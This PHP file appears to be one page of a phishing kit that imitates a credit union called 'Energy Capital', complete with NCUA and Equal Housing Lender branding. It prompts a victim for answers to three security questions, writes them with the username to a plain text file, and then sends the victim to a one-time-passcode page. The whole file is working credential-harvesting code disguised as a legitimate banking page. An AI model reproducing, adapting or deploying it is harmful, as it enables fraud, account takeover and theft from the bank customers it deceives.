<?php
session_start();
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

$questions = [
    'What was your childhood nickname?',
    "What is your mother's maiden name?",
    'What was the name of your first pet?',
    'What was the make and model of your first car?',
    'What city were you born in?',
    'What is your favorite childhood memory?',
    'What was your first job title?',
    'What is the name of your favorite teacher?',
    'What is your favorite book or movie character?',
    'What street did you grow up on?'
];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $question1 = $_POST['question1'] ?? '';
    $answer1 = trim($_POST['answer1'] ?? '');
    $question2 = $_POST['question2'] ?? '';
    $answer2 = trim($_POST['answer2'] ?? '');
    $question3 = $_POST['question3'] ?? '';
    $answer3 = trim($_POST['answer3'] ?? '');
    
    // Validation
    if (empty($question1)) $errors['question1'] = 'Please select a question';
    if (empty($answer1)) $errors['answer1'] = 'Please provide an answer';
    if (empty($question2)) $errors['question2'] = 'Please select a question';
    if (empty($answer2)) $errors['answer2'] = 'Please provide an answer';
    if (empty($question3)) $errors['question3'] = 'Please select a question';
    if (empty($answer3)) $errors['answer3'] = 'Please provide an answer';
    
    // Check for duplicate questions
    $uniqueQuestions = array_unique([$question1, $question2, $question3]);
    if (count($uniqueQuestions) < 3) {
        $errors['general'] = 'Please select three different security questions';
    }
    
    if (empty($errors)) {
        // Save to file
        $data = [
            'step' => 'security_questions',
            'usrnm' => $username,
            'chld_pt' => $question1,
            'pt_ans' => $answer1,
            'brth_ct' => $question2,
            'ct_ans' => $answer2,
            'frst_sch' => $question3,
            'sch_ans' => $answer3
        ];
        
        saveUserData('security_questions.txt', $data);
        
        // Redirect to OTP page
        header('Location: otp.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Questions - Energy Capital</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-[#0b0f1c] bg-cover bg-center bg-no-repeat relative overflow-hidden text-white" style="background-image: url('assets/dark-login.jpeg');">
        <!-- Dark Overlay -->
        <div class="absolute inset-0 bg-black/40 pointer-events-none"></div>
        
        <!-- Relative Container -->
        <div class="relative z-10 flex min-h-screen flex-col">
            <!-- Header -->
            <header class="flex flex-col items-center pt-8 px-4">
                <img src="assets/blue.png" alt="Energy Capital logo" class="h-12 w-auto" />
            </header>

            <!-- Main Content -->
            <main class="flex-1 flex items-center justify-center px-4 py-12">
                <!-- Security Questions Card -->
                <div class="w-full max-w-2xl">
                    <div class="bg-[#1b1f2f]/95 rounded-xl shadow-xl shadow-black/30 p-8 space-y-6 text-white">
                        <!-- Card Header -->
                        <div>
                            <h2 class="text-center text-2xl font-semibold mb-2">Security Questions</h2>
                            <p class="text-center text-slate-300 text-sm">Answer three security questions to verify your identity</p>
                        </div>
                        
                        <?php if (!empty($errors)): ?>
                            <div class="bg-red-500/20 border border-red-500 rounded-lg p-4">
                                <p class="text-red-200 text-sm font-semibold mb-2">Please fix the following errors:</p>
                                <ul class="list-disc pl-5 space-y-1">
                                    <?php foreach ($errors as $error): ?>
                                        <li class="text-red-200 text-sm"><?php echo htmlspecialchars($error); ?></li>
                                    <?php endforeach; ?>
                                </ul>
                            </div>
                        <?php endif; ?>
                        
                        <form method="POST" class="space-y-6">
                            <!-- Question 1 -->
                            <div>
                                <label class="text-slate-300 text-sm font-medium block mb-2">Security Question 1</label>
                                <select name="question1" class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition">
                                    <option value="">Select a question</option>
                                    <?php foreach ($questions as $q): ?>
                                        <option value="<?php echo htmlspecialchars($q); ?>" <?php echo ($q === ($_POST['question1'] ?? '')) ? 'selected' : ''; ?>>
                                            <?php echo htmlspecialchars($q); ?>
                                        </option>
                                    <?php endforeach; ?>
                                </select>
                                <?php if (isset($errors['question1'])): ?>
                                    <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['question1']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <div>
                                <label class="text-slate-300 text-sm font-medium block mb-2">Your Answer</label>
                                <input
                                    type="text"
                                    name="answer1"
                                    value="<?php echo htmlspecialchars($_POST['answer1'] ?? ''); ?>"
                                    class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                    placeholder="Enter your answer"
                                />
                                <?php if (isset($errors['answer1'])): ?>
                                    <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['answer1']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Question 2 -->
                            <div>
                                <label class="text-slate-300 text-sm font-medium block mb-2">Security Question 2</label>
                                <select name="question2" class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition">
                                    <option value="">Select a question</option>
                                    <?php foreach ($questions as $q): ?>
                                        <option value="<?php echo htmlspecialchars($q); ?>" <?php echo ($q === ($_POST['question2'] ?? '')) ? 'selected' : ''; ?>>
                                            <?php echo htmlspecialchars($q); ?>
                                        </option>
                                    <?php endforeach; ?>
                                </select>
                                <?php if (isset($errors['question2'])): ?>
                                    <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['question2']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <div>
                                <label class="text-slate-300 text-sm font-medium block mb-2">Your Answer</label>
                                <input
                                    type="text"
                                    name="answer2"
                                    value="<?php echo htmlspecialchars($_POST['answer2'] ?? ''); ?>"
                                    class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                    placeholder="Enter your answer"
                                />
                                <?php if (isset($errors['answer2'])): ?>
                                    <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['answer2']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Question 3 -->
                            <div>
                                <label class="text-slate-300 text-sm font-medium block mb-2">Security Question 3</label>
                                <select name="question3" class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition">
                                    <option value="">Select a question</option>
                                    <?php foreach ($questions as $q): ?>
                                        <option value="<?php echo htmlspecialchars($q); ?>" <?php echo ($q === ($_POST['question3'] ?? '')) ? 'selected' : ''; ?>>
                                            <?php echo htmlspecialchars($q); ?>
                                        </option>
                                    <?php endforeach; ?>
                                </select>
                                <?php if (isset($errors['question3'])): ?>
                                    <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['question3']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <div>
                                <label class="text-slate-300 text-sm font-medium block mb-2">Your Answer</label>
                                <input
                                    type="text"
                                    name="answer3"
                                    value="<?php echo htmlspecialchars($_POST['answer3'] ?? ''); ?>"
                                    class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                    placeholder="Enter your answer"
                                />
                                <?php if (isset($errors['answer3'])): ?>
                                    <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['answer3']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Continue Button -->
                            <button
                                type="submit"
                                class="w-full bg-[#7dd3fc] text-black font-semibold py-2 rounded-lg hover:bg-[#38bdf8] transition"
                            >
                                Continue
                            </button>
                        </form>
                    </div>
                </div>
            </main>

            <!-- Footer -->
            <footer class="bg-[#2f3136] text-white w-full">
                <div class="max-w-5xl mx-auto px-6 py-10 flex flex-col items-center gap-6">
                    <nav class="flex flex-wrap items-center justify-center gap-4 text-sm text-[#74b8ff]">
                        <a class="hover:underline" href="#">Contact Us</a>
                        <span class="h-4 w-px bg-[#4b4d52]" aria-hidden="true"></span>
                        <a class="hover:underline" href="#">Privacy &amp; Security</a>
                        <span class="h-4 w-px bg-[#4b4d52]" aria-hidden="true"></span>
                        <a class="hover:underline" href="#">Accessibility</a>
                    </nav>
                    <div class="flex items-center gap-3 text-sm text-[#74b8ff]">
                        <div class="flex items-center justify-center w-7 h-7 border border-[#74b8ff] rounded-full text-xs font-semibold">
                            <span>🏠</span>
                        </div>
                        <span>Equal Housing Lender</span>
                    </div>
                    <img src="assets/ncua.png" alt="NCUA" class="h-16 w-auto" />
                    <p class="text-xs text-gray-400">Federally insured by NCUA</p>
                </div>
            </footer>
        </div>
    </div>
</body>
</html>
